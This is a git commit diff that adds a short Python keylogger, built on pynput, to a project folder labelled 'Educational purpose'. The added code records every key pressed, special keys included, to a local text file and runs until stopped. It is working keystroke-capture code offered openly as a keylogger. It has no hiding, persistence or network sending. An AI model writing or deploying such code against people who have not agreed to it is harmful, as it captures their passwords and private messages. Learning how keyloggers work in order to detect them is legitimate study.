93958ae8a4a1b70bc11d1f7d33b0a95a47cbdb1a
Murtaza <murtazaansari242@gmail.com>
2025-06-12 23:07:38 +0500

    basic keylogger created

--- Keylogger(Educational purpose)/main.py
+++ Keylogger(Educational purpose)/main.py
@@ -1,1 +1,26 @@
-print("hello keylogger")
+from pynput import keyboard
+
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            elif key == keyboard.Key.tab:
+                f.write("\t")
+            else:
+                f.write(f"[{key.name}]")
+
+def main():
+    print("Keylogger started. Press Ctrl + C to stop.")
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    main()
